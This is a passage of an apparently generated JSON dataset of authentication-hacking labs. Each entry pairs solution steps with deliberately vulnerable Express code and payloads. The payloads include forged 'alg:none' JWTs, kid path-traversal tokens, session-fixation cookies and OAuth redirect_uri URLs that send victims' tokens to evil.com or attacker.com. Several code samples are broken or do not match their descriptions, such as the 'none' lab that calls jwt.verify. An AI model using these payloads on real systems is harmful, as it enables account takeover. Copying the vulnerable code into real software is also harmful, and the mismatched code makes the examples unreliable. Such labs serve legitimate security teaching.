        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); app.post('/graphql', (req, res) => { const authHeader = req.headers['authorization']; const token = authHeader && authHeader.split(' ')[1]; try { const decoded = jwt.verify(token, 'supersecret'); if (decoded.username) res.json({ data: { me: { username: decoded.username } } }); else res.status(401).send('Unauthorized'); } catch (err) { res.status(401).send('JWT Error'); } }); app.listen(4000);",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
          "{ \"query\": \"{ me { username email } }\" }",
          "Authorization: Bearer [forged JWT with alg: none]"
        ]
      },
      {
        "Lab scenario": "MFA Bypass via Debug Parameter Injection in REST API",
        "Lab Description": "This lab’s REST-based login system includes a hidden debug parameter that allows bypassing the MFA challenge. When the debug=true parameter is set in the second-phase login POST request, the backend skips the MFA verification logic entirely. To solve: login as Carlos using the known password and bypass the MFA code requirement using the debug injection.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Burp Suite to intercept a full login request. Submit your own credentials and observe the 2FA challenge phase triggered in POST /verify.",
          "Repeat the process with the victim's username and password. In the intercepted request, add a debug=true parameter to the JSON body.",
          "Send the modified request with valid credentials and the added parameter to Burp Repeater.",
          "Observe that the MFA step is skipped and the server responds with a session cookie for Carlos.",
          "Visit /my-account using the new session cookie and verify successful login."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); let users = [{ username: 'carlos', password: 'carpass', mfa: '333999' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); res.status(200).json({ mfaRequired: true }); }); app.post('/verify', (req, res) => { const { username, code, debug } = req.body; if (debug === 'true') return res.send(`Login successful for ${username}`); const user = users.find(u => u.username === username); if (user && user.mfa === code) res.send(`Login successful for ${username}`); else res.status(403).send('Invalid MFA code'); }); app.listen(4000);",
        "payloads": [
          "{ \"username\": \"carlos\", \"password\": \"carpass\" }",
          "{ \"username\": \"carlos\", \"code\": \"000000\", \"debug\": \"true\" }",
          "POST /verify with Content-Type: application/json and debug=true"
        ]
      },
      {
        "Lab scenario": "Session fixation via insecure Set-Cookie logic in login response",
        "Lab Description": "This lab's session management implementation is vulnerable to session fixation due to insecure handling of Set-Cookie during authentication. The application reuses a user-supplied session token without regeneration after login. To solve: hijack a victim session using a pre-authenticated session ID and access Carlos's account page.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Burp Suite's Proxy to intercept a GET /login request and observe Set-Cookie behavior.",
          "In Burp Repeater, predefine a sessionID value and access the login page using the custom cookie.",
          "Log in with valid victim credentials using the same sessionID and observe that session token is not changed.",
          "Use the fixed sessionID to impersonate the victim in a different browser.",
          "Access /account/carlos to solve the lab."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: false })); const sessions = {}; const users = { carlos: 'hunter2' }; app.get('/login', (req, res) => { let sid = req.cookies.sid || Math.random().toString(36).substring(2); res.cookie('sid', sid); res.send('<form method=post><input name=username><input name=password><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { const sid = req.cookies.sid; sessions[sid] = username; res.redirect('/account'); } else { res.send('Login failed'); } }); app.get('/account', (req, res) => { const user = sessions[req.cookies.sid]; if (user) res.send(`Welcome ${user}`); else res.send('Not logged in'); }); app.listen(3000);",
        "payloads": [
          "Set-Cookie: sid=fixate123; Path=/",
          "POST /login HTTP/1.1 with sid=fixate123",
          "GET /account with Cookie: sid=fixate123"
        ]
      },
      {
        "Lab scenario": "JWT algorithm confusion leads to signature bypass",
        "Lab Description": "The app uses JWTs for authentication and fails to verify the algorithm properly, allowing an attacker to change the token's algorithm to 'none' to bypass signature verification. The application decodes and trusts any token if it passes decoding. To solve: forge a JWT token for carlos with 'none' alg and access /dashboard.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Burp Suite to capture a valid JWT token issued after login and decode it using jwt.io.",
          "Replace the header's 'alg' field with 'none' and modify the payload to impersonate 'carlos'.",
          "Remove the signature portion entirely to create a two-part JWT.",
          "Use Postman to send a GET /dashboard request with the forged token in Authorization: Bearer.",
          "Verify access as carlos by confirming welcome message on dashboard."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'supersecret'; app.get('/token', (req, res) => { const token = jwt.sign({ user: 'guest' }, secret, { algorithm: 'HS256' }); res.send({ token }); }); app.get('/dashboard', (req, res) => { const auth = req.headers.authorization; const token = auth && auth.split(' ')[1]; if (!token) return res.status(401).send('No token'); const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = jwt.decode(token); if (payload.user === 'carlos') return res.send('Welcome carlos'); } else { try { const payload = jwt.verify(token, secret); if (payload.user === 'carlos') return res.send('Welcome carlos'); } catch { return res.status(403).send('Invalid token'); } } res.status(403).send('Unauthorized'); }); app.listen(4000);",
        "payloads": [
          "Header: { \"alg\": \"none\", \"typ\": \"JWT\" }",
          "Payload: { \"user\": \"carlos\" }",
          "JWT: base64(header).base64(payload)."
        ]
      },
      {
        "Lab scenario": "OAuth implicit flow misconfiguration allows token stealing via redirect",
        "Lab Description": "This lab simulates a misconfigured OAuth implicit flow that reflects access tokens in the URL fragment. An attacker can inject a malicious redirect_uri to leak the token to an external site. To solve: steal Carlos's OAuth access token and use it to access his /user/settings page.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Burp to observe the /authorize endpoint and identify the use of implicit OAuth flow (response_type=token).",
          "Craft a malicious URL with a redirect_uri pointing to your server and send it to Carlos.",
          "Run a token-stealing listener (e.g., Python HTTP server) to capture the token from redirected traffic.",
          "Extract the token from the intercepted URL fragment.",
          "Send a GET /user/settings request with Authorization: Bearer <stolen_token> and verify access."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); app.get('/authorize', (req, res) => { const { redirect_uri, response_type, client_id } = req.query; if (response_type === 'token' && client_id === 'trusted') { const token = 'access-token-carlos'; res.redirect(`${redirect_uri}#access_token=${token}&token_type=bearer`); } else { res.send('Invalid request'); } }); app.get('/user/settings', (req, res) => { const auth = req.headers.authorization; if (auth === 'Bearer access-token-carlos') res.send('Welcome to Carlos's settings'); else res.status(403).send('Forbidden'); }); app.listen(5000);",
        "payloads": [
          "https://vulnerable-app.com/authorize?response_type=token&client_id=trusted&redirect_uri=https://evil.com/callback",
          "Capture token from URL fragment: #access_token=access-token-carlos",
          "Authorization: Bearer access-token-carlos"
        ]
      }, 
      {
        "Lab scenario": "JWT None Algorithm Authentication Bypass in Authorization Header",
        "Lab Description": "The application's authentication mechanism relies on JWTs passed in the Authorization header. However, the server fails to properly validate the signing algorithm. The application accepts tokens signed with 'alg':'none', bypassing signature verification. To solve: gain access to Carlos's account using a forged token.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1. Use Burp Suite to intercept a request after logging in with any valid user. Extract the JWT from the Authorization header.",
          "2. Decode the token using jwt.io or Postman to view the header and payload.",
          "3. Modify the 'alg' in the header to 'none' and set the payload 'username':'carlos'.",
          "4. Remove the signature portion of the JWT entirely.",
          "5. Send the forged token in the Authorization header via Postman or Burp Repeater and access /my-account."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const secret = 'supersecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const authHeader = req.headers['authorization']; const token = authHeader && authHeader.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (!payload) return res.status(401).send('Invalid token'); const user = jwt.verify(token, secret); res.send(`Account: ${user.username}`); }); app.listen(4001);",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
          "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
        ]
      },
      {
        "Lab scenario": "Session Fixation in Cookie Handling",
        "Lab Description": "The application assigns a session cookie to anonymous users but fails to rotate it after login. This allows an attacker to fix a victim's session beforehand and hijack their account once they log in. To solve: log in as Carlos using a pre-assigned session cookie.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Visit the app without logging in and capture the Set-Cookie: session=<token> header using Burp.",
          "2. Send a phishing or clickjacking payload that forces Carlos to log in while having this attacker-set cookie.",
          "3. Once Carlos logs in, reuse the same session cookie to hijack his session.",
          "4. Access the /my-account endpoint with the fixed session cookie in Burp Repeater.",
          "5. Confirm ownership of Carlos’s session and solve the lab."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; const users = [{ username: 'carlos', password: 'hunter2' }]; app.use((req, res, next) => { if (!req.cookies.session) { const sid = Math.random().toString(36).substring(7); sessions[sid] = {}; res.cookie('session', sid); } next(); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid login'); sessions[req.cookies.session].user = username; res.send('Login successful'); }); app.get('/my-account', (req, res) => { const session = sessions[req.cookies.session]; if (session && session.user) res.send(`Welcome ${session.user}`); else res.status(403).send('Forbidden'); }); app.listen(4002);",
        "payloads": [
          "Cookie: session=attackerSession",
          "session fixation via iframe login using shared cookie"
        ]
      },
      {
        "Lab scenario": "OAuth Misconfiguration in Redirect URI",
        "Lab Description": "The OAuth flow used by the application is improperly configured to allow open redirect URIs. This enables attackers to intercept access tokens by specifying their own domain. To solve: capture Carlos’s OAuth access token and use it to access /my-account.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Start OAuth login flow and observe that the redirect_uri parameter is passed via GET.",
          "2. Modify the redirect_uri to a malicious server under your control (e.g., https://attacker.com/callback).",
          "3. Use a phishing email to get Carlos to authorize access via the manipulated OAuth URL.",
          "4. Intercept the access token sent to your server after Carlos grants permission.",
          "5. Use Postman or Burp Repeater to access /my-account with the stolen token in the Authorization header."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); app.get('/auth', (req, res) => { const { redirect_uri, client_id } = req.query;  if (client_id === 'trusted-client') { const token = Buffer.from('carlos-token').toString('base64'); const redirectURL = `${redirect_uri}#access_token=${token}`; res.redirect(redirectURL); } else { res.status(400).send('Invalid client'); } }); app.get('/my-account', (req, res) => { const auth = req.headers['authorization']; if (!auth) return res.status(401).send('Unauthorized'); const token = auth.split(' ')[1]; if (Buffer.from(token, 'base64').toString() === 'carlos-token') res.send('Carlos Account'); else res.status(403).send('Invalid token'); }); app.listen(4003);",
        "payloads": [
          "https://target.com/auth?client_id=trusted-client&redirect_uri=https://evil.com/callback",
          "Authorization: Bearer Y2FybG9zLXRva2Vu"
        ]
      },
      {
        "Lab scenario": "JWT alg:none bypass in REST API authentication",
        "Lab Description": "This lab's JWT-based authentication system fails to properly validate token signatures. The application accepts unsigned tokens when the alg header is set to 'none'. To solve: craft a modified JWT with admin privileges without knowing the secret key.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Intercept a valid JWT using Burp Suite while logged in as a low-privilege user",
          "Decode the JWT using jwt.io or Burp Decoder to analyze its structure",
          "Modify the alg header to 'none' and change the role claim to 'admin'",
          "Remove the signature portion of the JWT (after the last dot)",
          "Submit the modified token in the Authorization header to access admin functionality"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\n\nconst users = {\n  'user1': { password: 'pass123', role: 'user' },\n  'admin': { password: 'adminPass', role: 'admin' }\n};\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (users[username] && users[username].password === password) {\n    const token = jwt.sign({ user: username, role: users[username].role }, 'secretKey');\n    res.json({ token });\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\n\napp.get('/admin', (req, res) => {\n  const token = req.headers.authorization?.split(' ')[1];\n  try {\n    const decoded = jwt.verify(token, { algorithms: ['HS256', 'none'] });\n    if (decoded.role === 'admin') {\n      res.send('Admin panel accessed');\n    } else {\n      res.status(403).send('Forbidden');\n    }\n  } catch (err) {\n    res.status(401).send('Invalid token');\n  }\n});\n\napp.listen(3000);",
        "payloads": [
          "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoidXNlcjEiLCJyb2xlIjoiYWRtaW4ifQ.",
          "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6InVzZXIxIiwicm9sZSI6ImFkbWluIn0.",
          "eyJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ."
        ]
      },
      {
        "Lab scenario": "OAuth token leakage via misconfigured redirect_uri",
        "Lab Description": "This lab's OAuth implementation fails to properly validate redirect_uri parameters, allowing token leakage to attacker-controlled domains. The application generates OAuth tokens after successful authentication. To solve: steal a valid OAuth token by manipulating the redirect flow.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Identify the OAuth authorization endpoint using OWASP ZAP's spider functionality",
          "Intercept the initial OAuth flow and modify the redirect_uri parameter to point to an attacker-controlled domain",
          "Bypass client-side validation of redirect_uri by URL-encoding special characters",
          "Capture the authorization code or token when the victim gets redirected",
          "Exchange the stolen code for an access token at the OAuth token endpoint"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst axios = require('axios');\nconst app = express();\n\nconst clients = {\n  'client123': { secret: 'sec456', redirectUris: ['https://legit.com/callback'] }\n};\n\napp.get('/oauth/authorize', (req, res) => {\n  const { client_id, redirect_uri, state } = req.query;\n  const client = clients[client_id];\n  \n  if (!client) return res.status(400).send('Invalid client');\n  \n  if (req.query.response_type === 'code') {\n    const authCode = 'auth_' + Math.random().toString(36).substr(2, 9);\n    const redirectUrl = new URL(redirect_uri);\n    redirectUrl.searchParams.set('code', authCode);\n    if (state) redirectUrl.searchParams.set('state', state);\n    res.redirect(redirectUrl.toString());\n  } else {\n    res.status(400).send('Unsupported response_type');\n  }\n});\n\napp.post('/oauth/token', (req, res) => {\n  const { client_id, client_secret, code } = req.body;\n  const client = clients[client_id];\n  \n  if (!client || client.secret !== client_secret) {\n    return res.status(401).json({ error: 'invalid_client' });\n  }\n  \n  res.json({\n    access_token: 'token_' + Math.random().toString(36).substr(2, 16),\n    token_type: 'bearer',\n    expires_in: 3600\n  });\n});\n\napp.listen(3000);",
        "payloads": [
          "https://attacker.com/callback?code=AUTH_CODE&state=123",
          "https://legit.com@attacker.com/callback?code=AUTH_CODE",
          "https://legit.com/callback.attacker.com?code=AUTH_CODE"
        ]
      },
      {
        "Lab scenario": "Session fixation via insecure session regeneration in GraphQL endpoint",
        "Lab Description": "This lab's GraphQL API fails to properly regenerate session tokens after authentication, allowing session fixation attacks. The application maintains the same session ID pre- and post-login. To solve: fixate a session on a victim's browser and gain access when they authenticate.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Obtain a valid session cookie before authentication using Postman",
          "Craft a GraphQL mutation containing the session cookie in a CSRF attack",
          "Use OWASP ZAP to test session token behavior during login flows",
          "Verify the session remains identical after authentication by comparing cookies",
          "Inject the fixated session into a browser to hijack the authenticated session"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst { graphqlHTTP } = require('express-graphql');\nconst { buildSchema } = require('graphql');\nconst cookieParser = require('cookie-parser');\n\nconst app = express();\napp.use(cookieParser());\n\nconst schema = buildSchema(`\n  type Query {\n    getUser: User\n  }\n  type Mutation {\n    login(username: String!, password: String!): User\n  }\n  type User {\n    username: String\n    role: String\n  }\n`);\n\nconst root = {\n  getUser: (args, req) => {\n    if (!req.cookies.session) throw new Error('Not authenticated');\n    return { username: req.cookies.session.user, role: req.cookies.session.role };\n  },\n  login: ({ username, password }, req) => {\n    if (username === 'admin' && password === 'admin123') {\n      if (!req.cookies.session) {\n        req.cookies.session = { id: Math.random().toString(36).substr(2, 10) };\n      }\n      req.cookies.session.user = username;\n      req.cookies.session.role = 'admin';\n      return { username, role: 'admin' };\n    }\n    throw new Error('Invalid credentials');\n  }\n};\n\napp.use('/graphql', graphqlHTTP({\n  schema: schema,\n  rootValue: root,\n  graphiql: true\n}));\n\napp.listen(3000);",
        "payloads": [
          "mutation { login(username: \"admin\", password: \"admin123\") { username role } }",
          "query { getUser { username role } }",
          "POST /graphql HTTP/1.1\nHost: vulnerable.com\nCookie: session=fixated_id\nContent-Type: application/json\n\n{\"query\":\"mutation { login(username: \\\"admin\\\", password: \\\"admin123\\\") { username role } }\"}"
        ]
      },
      {
        "Lab scenario": "JWT kid header path traversal in REST API authentication",
        "Lab Description": "This lab's JWT validation improperly uses the kid header to load verification keys from the filesystem without proper sanitization. The application blindly trusts the kid parameter when selecting verification keys. To solve: craft a JWT that forces the server to use a predictable public key file for verification.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Intercept a valid JWT using Burp Suite and decode it to analyze the kid header",
          "Modify the kid parameter to attempt directory traversal (../../../../etc/passwd)",
          "When this fails, test for predictable key locations by setting kid to known paths like ../../../../var/www/keys/public.pem",
          "Generate a new token signed with the predictable public key and elevated privileges",
          "Submit the forged token in the Authorization header to access admin functionality"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst fs = require('fs');\nconst app = express();\n\nconst users = {\n  'user': { password: 'normalpass', role: 'user' },\n  'admin': { password: 'adminpass', role: 'admin' }\n};\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (users[username] && users[username].password === password) {\n    const token = jwt.sign({ user: username, role: users[username].role }, 'secretKey', { header: { kid: 'safeKey' } });\n    res.json({ token });\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\n\napp.get('/admin', (req, res) => {\n  const token = req.headers.authorization?.split(' ')[1];\n  try {\n    const decoded = jwt.verify(token, (header, callback) => {\n      const keyPath = `/var/www/keys/${header.kid}`;\n      fs.readFile(keyPath, (err, key) => {\n        callback(err, key);\n      });\n    });\n    if (decoded.role === 'admin') {\n      res.send('Admin panel accessed');\n    } else {\n      res.status(403).send('Forbidden');\n    }\n  } catch (err) {\n    res.status(401).send('Invalid token');\n  }\n});\n\napp.listen(3000);",
        "payloads": [
          "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uLy4uLy4uL3Zhci93d3cva2V5cy9wdWJsaWMucGVtIn0.eyJ1c2VyIjoidXNlciIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYxNTIzOTAyMn0.fake_signature",
          "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uLy4uLy4uL2V0Yy9wYXNzd2QifQ.eyJ1c2VyIjoidXNlciIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYxNTIzOTAyMn0.fake_signature",
          "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii9ldGMvcGFzc3dkIn0.eyJ1c2VyIjoidXNlciIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYxNTIzOTAyMn0.fake_signature"
        ]
      },
      {
        "Lab scenario": "OAuth token hijacking via state parameter reflection",
        "Lab Description": "This lab's OAuth implementation fails to validate the state parameter between requests, allowing token hijacking. The application reflects the state parameter from the authorization request to the callback without validation. To solve: intercept an OAuth flow and steal a victim's token by predicting the state value.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Initiate an OAuth flow using Postman and observe the state parameter format",
          "Set up a malicious redirect URI in your OAuth client configuration",
          "Intercept a victim's authorization request using Burp Suite",
          "Modify the redirect_uri to point to your server while preserving the state",
          "Capture the authorization code when the victim is redirected to your site",
          "Exchange the stolen code for an access token at the OAuth token endpoint"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst axios = require('axios');\nconst app = express();\n\nconst clients = {\n  'client123': { secret: 'sec456', redirectUris: ['https://legit.com/callback', 'https://attacker.com'] }\n};\n\nlet authRequests = {};\n\napp.get('/oauth/authorize', (req, res) => {\n  const { client_id, redirect_uri, state, response_type } = req.query;\n  const client = clients[client_id];\n  \n  if (!client || !client.redirectUris.includes(redirect_uri)) {\n    return res.status(400).send('Invalid client or redirect URI');\n  }\n  \n  authRequests[state] = { client_id, redirect_uri };\n  res.redirect(`${redirect_uri}?code=auth_code&state=${state}`);\n});\n\napp.post('/oauth/token', (req, res) => {\n  const { client_id, client_secret, code, state } = req.body;\n  const client = clients[client_id];\n  \n  if (!client || client.secret !== client_secret) {\n    return res.status(401).json({ error: 'invalid_client' });\n  }\n  \n  res.json({\n    access_token: 'token_' + Math.random().toString(36).substr(2, 16),\n    token_type: 'bearer',\n    expires_in: 3600\n  });\n});\n\napp.listen(3000);",
        "payloads": [
          "https://victim.com/oauth/authorize?client_id=client123&redirect_uri=https://attacker.com&response_type=code&state=12345",
          "https://victim.com/oauth/authorize?client_id=client123&redirect_uri=https://legit.com/callback&response_type=code&state=12345",
          "https://victim.com/oauth/authorize?client_id=client123&redirect_uri=https://legit.com@attacker.com&response_type=code&state=12345"
        ]
      },
      {
        "Lab scenario": "Session fixation via GraphQL introspection leaks",
        "Lab Description": "This lab's GraphQL endpoint exposes session management functionality through introspection, allowing attackers to fixate sessions. The application's GraphQL schema reveals mutation fields for session handling without proper access controls. To solve: use introspection to discover session mutations and fixate a session on a victim's browser.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use GraphiQL or Postman to send an introspection query to the GraphQL endpoint",
          "Analyze the schema to discover session-related mutations",
          "Craft a mutation to generate or modify session tokens",
          "Fixate the generated session token in a victim's browser via XSS or social engineering",
          "Wait for the victim to authenticate and hijack their session"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst { graphqlHTTP } = require('express-graphql');\nconst { buildSchema } = require('graphql');\nconst cookieParser = require('cookie-parser');\n\nconst app = express();\napp.use(cookieParser());\n\nconst schema = buildSchema(`\n  type Query {\n    getUser: User\n    getSession: Session\n  }\n  type Mutation {\n    login(username: String!, password: String!): User\n    createSession(username: String!): Session\n    rotateSession: Session\n  }\n  type User {\n    username: String\n    role: String\n  }\n  type Session {\n    id: String\n    expires: String\n  }\n`);\n\nconst root = {\n  getUser: (args, req) => {\n    if (!req.cookies.session) throw new Error('Not authenticated');\n    return { username: req.cookies.session.user, role: req.cookies.session.role };\n  },\n  getSession: (args, req) => {\n    return { id: req.cookies.session?.id, expires: '2023-12-31' };\n  },\n  login: ({ username, password }, req) => {\n    if (username === 'admin' && password === 'admin123') {\n      if (!req.cookies.session) {\n        req.cookies.session = { id: Math.random().toString(36).substr(2, 10) };\n      }\n      req.cookies.session.user = username;\n      req.cookies.session.role = 'admin';\n      return { username, role: 'admin' };\n    }\n    throw new Error('Invalid credentials');\n  },\n  createSession: ({ username }, req) => {\n    const sessionId = Math.random().toString(36).substr(2, 10);\n    return { id: sessionId, expires: '2023-12-31' };\n  },\n  rotateSession: (args, req) => {\n    if (!req.cookies.session) throw new Error('No session');\n    req.cookies.session.id = Math.random().toString(36).substr(2, 10);\n    return { id: req.cookies.session.id, expires: '2023-12-31' };\n  }\n};\n\napp.use('/graphql', graphqlHTTP({\n  schema: schema,\n  rootValue: root,\n  graphiql: true\n}));\n\napp.listen(3000);",
        "payloads": [
          "mutation { createSession(username: \"admin\") { id } }",
          "query { __schema { mutationType { fields { name description } } }",
          "mutation { rotateSession { id } }"
        ]
      },
      {
        "Lab scenario": "JWT signature stripping in microservice authentication",
        "Lab Description": "This lab's microservice architecture fails to properly validate JWT signatures across services. The frontend service accepts unsigned tokens when forwarded from internal services. To solve: bypass authentication by stripping the signature from a valid JWT and injecting it into internal service calls.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Intercept a valid JWT using Burp Suite while making normal API requests",
          "Remove the signature portion and test if the unsigned token is accepted",
          "Identify internal service endpoints through API documentation or fuzzing",
          "Craft a request to an internal user management service with the unsigned token",
          "Escalate privileges by modifying user attributes in the internal service response"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\n\nconst internalServices = {\n  'user-service': 'http://internal-user-service'\n};\n\napp.use((req, res, next) => {\n  const token = req.headers.authorization?.split(' ')[1];\n  if (token) {\n    try {\n      const decoded = jwt.decode(token, { complete: true });\n      if (req.headers['x-internal-request'] === 'true') {\n        req.user = decoded.payload;\n        return next();\n      }\n      jwt.verify(token, 'secretKey');\n      req.user = decoded.payload;\n    } catch (err) {\n      return res.status(401).send('Invalid token');\n    }\n  }\n  next();\n});\n\napp.get('/internal/user', async (req, res) => {\n  const response = await fetch(`${internalServices['user-service']}/user`, {\n    headers: {\n      'Authorization': `Bearer ${req.headers.authorization?.split(' ')[1]}`,\n      'X-Internal-Request': 'true'\n    }\n  });\n  res.json(await response.json());\n});\n\napp.listen(3000);",
        "payloads": [
          "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.",
          "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.",
          "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ"
        ]
      },
      {
        "Lab scenario": "OAuth token leakage via insecure PKCE implementation",
        "Lab Description": "This lab's OAuth implementation uses Proof Key for Code Exchange (PKCE) incorrectly, allowing authorization code interception. The application fails to validate the code_verifier properly during token exchange. To solve: intercept an authorization code and exchange it for a token without the original code_verifier.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Initiate an OAuth flow using Postman with PKCE parameters",
          "Intercept the authorization code response using Burp Suite",
          "Observe the PKCE code_challenge method and parameters",
          "Attempt token exchange without the code_verifier parameter",
          "Modify the code_challenge_method to 'plain' when the original uses 'S256'",
          "Complete the token exchange to obtain an access token"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst axios = require('axios');\nconst app = express();\n\nconst clients = {\n  'client123': { \n    secret: 'sec456', \n    redirectUris: ['https://client.com/callback'],\n    requirePKCE: true\n  }\n};\n\nlet authCodes = {};\n\napp.get('/oauth/authorize', (req, res) => {\n  const { client_id, redirect_uri, code_challenge, code_challenge_method } = req.query;\n  const client = clients[client_id];\n  \n  if (!client) return res.status(400).send('Invalid client');\n  \n  const authCode = 'code_' + Math.random().toString(36).substr(2, 8);\n  authCodes[authCode] = { \n    client_id,\n    code_challenge,\n    code_challenge_method\n  };\n  \n  res.redirect(`${redirect_uri}?code=${authCode}`);\n});\n\napp.post('/oauth/token', (req, res) => {\n  const { client_id, client_secret, code, code_verifier } = req.body;\n  const client = clients[client_id];\n  \n  if (!client || client.secret !== client_secret) {\n    return res.status(401).json({ error: 'invalid_client' });\n  }\n  \n  if (client.requirePKCE && !authCodes[code]) {\n    return res.status(400).json({ error: 'invalid_grant' });\n  }\n  \n  res.json({\n    access_token: 'token_' + Math.random().toString(36).substr(2, 16),\n    token_type: 'bearer',\n    expires_in: 3600\n  });\n});\n\napp.listen(3000);",
        "payloads": [
          "https://oauth-server.com/oauth/token?client_id=client123&client_secret=sec456&code=intercepted_code&grant_type=authorization_code",
          "https://oauth-server.com/oauth/token?client_id=client123&client_secret=sec456&code=intercepted_code&grant_type=authorization_code&code_challenge_method=plain",
          "https://oauth-server.com/oauth/token?client_id=client123&client_secret=sec456&code=intercepted_code&grant_type=authorization_code&code_verifier="
        ]
      },
      {
        "Lab scenario": "Session fixation via WebSocket handshake",
        "Lab Description": "This lab's WebSocket implementation creates sessions during the HTTP handshake without proper validation. The application assigns session identifiers before authentication is complete. To solve: fixate a session during the WebSocket handshake and hijack it after victim authentication.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Establish a WebSocket connection using Burp Suite's WebSockets history",
          "Analyze the handshake request for session identifiers",
          "Modify the handshake request to inject a known session ID",
          "Trigger authentication through the WebSocket channel",
          "Reuse the fixated session ID in a new connection to hijack the authenticated session"
        ],
        "Vulnerability name": "Authentication",
